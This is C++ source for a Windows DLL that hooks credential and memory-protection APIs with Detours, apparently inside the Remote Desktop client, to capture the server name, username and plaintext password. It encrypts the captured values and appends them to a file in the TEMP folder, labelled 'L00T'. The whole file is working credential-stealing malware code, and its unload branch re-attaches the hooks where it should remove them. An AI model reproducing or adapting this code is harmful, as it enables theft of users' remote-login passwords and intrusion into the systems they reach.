#include <Windows.h>
#include <VersionHelpers.h>
#include <string>

#include "HookedHelpers.h"
#include "AES.h"

#ifdef _WIN64
#include "Detours_x64/detours.h"
#pragma comment(lib, "Detours_x64/detours.lib")
#else
#include "Detours_x86/detours.h"
#pragma comment(lib, "Detours_x86/detours.lib")
#endif 

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "crypt32.lib")

std::string ConvertToString(const std::wstring& DLLName)
{
	//size_t len = WideCharToMultiByte(CP_ACP, 0, DLLName.c_str(), DLLName.size() + 1, 0, 0, 0, 0);
	int len = WideCharToMultiByte(CP_ACP, 0, DLLName.c_str(), static_cast<int>(DLLName.size() + 1), 0, 0, 0, 0);
	std::string result(len, '\0');

	WideCharToMultiByte(CP_ACP, 0, DLLName.c_str(), static_cast<int>(DLLName.size() + 1), &result[0], len, 0, 0);
	return result;
}

BOOL WriteToFile(std::string L00T)
{
	std::wstring FullPath(1024, '\0');
	DWORD lpNumberOfBytesWritten = 0;

	DWORD dwRet = GetEnvironmentVariable(L"TEMP", &FullPath[0], 1024);
	FullPath.resize(dwRet);
	FullPath.append(L"\\whatever.txt");

	HANDLE hFile = CreateFile(FullPath.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false; // hmmm..would this work in a dll?
	}

	WriteFile(hFile, L00T.c_str(), static_cast<DWORD>(L00T.size()), &lpNumberOfBytesWritten, NULL);
	CloseHandle(hFile);
	return true;
}

__declspec(dllexport) BOOL WINAPI HookedCredRead(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIAL* Credential)
{
	RemoteDesktop.lpServerAddress = TargetName;
	return True_CredRead(TargetName, Type, Flags, Credential);
}

__declspec(dllexport) SECURITY_STATUS WINAPI HookedSspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName)
{
	RemoteDesktop.lpServerAddress = pszTargetName;
	return True_SspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}

__declspec(dllexport) BOOL WINAPI HookedCryptProtectMemory(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags)
{
	DWORD cbPass = 0;
	LPVOID lpPassword = NULL;

	int* ptr = (int*)pDataIn;
	LPVOID lpPasswordAddress = ptr + 1;
	memcpy(&cbPass, pDataIn, 4);

	if (cbPass > 2)
	{
		SIZE_T written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
		RemoteDesktop.lpPassword = static_cast<LPCWSTR>(lpPassword);

		if (!RemoteDesktop.lpServerAddress.empty() && !RemoteDesktop.lpUsername.empty() && !RemoteDesktop.lpPassword.empty())
		{
			AES *EncryptBuffer = new AES();
			if (!EncryptBuffer->initialize())
			{
				MessageBox(NULL, L"Failed at initializing AES!", L"AES Encryption", MB_OK);
				return True_CryptProtectMemory(pDataIn, cbDataIn, dwFlags); //??
			}

			std::wstring lpBuffer = RemoteDesktop.lpServerAddress + L"::";
			lpBuffer += RemoteDesktop.lpUsername + L"::";
			lpBuffer += RemoteDesktop.lpPassword;

			std::string lpBuffer2 = ConvertToString(lpBuffer);
			EncryptBuffer->CNGEncrypt(lpBuffer2);

			MessageBoxA(NULL, reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()), "Encrypted String", MB_OK);
			//MessageBox(NULL, lpBuffer.c_str(), L"Just a PoC, not final", MB_OK);
			WriteToFile(reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()));
			// Clean up the struct so it won't constantly send anything
			RemoteDesktop.lpServerAddress.clear();
			RemoteDesktop.lpUsername.clear();
			RemoteDesktop.lpPassword.clear();
		}
	}
	return True_CryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

__declspec(dllexport) BOOL WINAPI HookedCredIsMarshaledCredential(LPCWSTR MarshaledCredential)
{
	RemoteDesktop.lpUsername = MarshaledCredential;
	return True_CredIsMarshaledCredential(MarshaledCredential);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	LONG status = 0;

	if (DetourIsHelperProcess())
	{
		return TRUE;
	}

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		status = DetourTransactionBegin();
		if (status == ERROR_INVALID_OPERATION)
		{
			MessageBox(NULL, L"Failed at DetourTransactionBegin!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourUpdateThread(GetCurrentThread());
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourUpdateThread!", NULL, MB_ICONERROR);
			return FALSE;
		}

		if (IsWindows8OrGreater())
		{
			status = DetourAttach(&(PVOID&)True_SspiPrepareForCredRead, HookedSspiPrepareForCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for SspiPrepareForCredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}
		else
		{
			status = DetourAttach(&(PVOID&)True_CredRead, HookedCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for CredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}

		status = DetourAttach(&(PVOID&)True_CryptProtectMemory, HookedCryptProtectMemory);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CryptProtectMemory!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourAttach(&(PVOID&)True_CredIsMarshaledCredential, HookedCredIsMarshaledCredential);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CredIsMarshaledCredential!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourTransactionCommit();
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourTransactionCommit!", NULL, MB_ICONERROR);
			return FALSE;
		}
		break;
	case DLL_PROCESS_DETACH:
		status = DetourTransactionBegin();
		if (status == ERROR_INVALID_OPERATION)
		{
			MessageBox(NULL, L"Failed at DetourTransactionBegin!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourUpdateThread(GetCurrentThread());
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourUpdateThread!", NULL, MB_ICONERROR);
			return FALSE;
		}

		if (IsWindows8OrGreater())
		{
			status = DetourAttach(&(PVOID&)True_SspiPrepareForCredRead, HookedSspiPrepareForCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for SspiPrepareForCredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}
		else
		{
			status = DetourAttach(&(PVOID&)True_CredRead, HookedCredRead);
			if (status != NO_ERROR)
			{
				MessageBox(NULL, L"Failed at DetourAttach for CredRead!", NULL, MB_ICONERROR);
				return FALSE;
			}
		}

		status = DetourAttach(&(PVOID&)True_CryptProtectMemory, HookedCryptProtectMemory);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CryptProtectMemory!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourAttach(&(PVOID&)True_CredIsMarshaledCredential, HookedCredIsMarshaledCredential);
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourAttach for CredIsMarshaledCredential!", NULL, MB_ICONERROR);
			return FALSE;
		}

		status = DetourTransactionCommit();
		if (status != NO_ERROR)
		{
			MessageBox(NULL, L"Failed at DetourTransactionCommit!", NULL, MB_ICONERROR);
			return FALSE;
		}
		break;
	}
	return TRUE;
}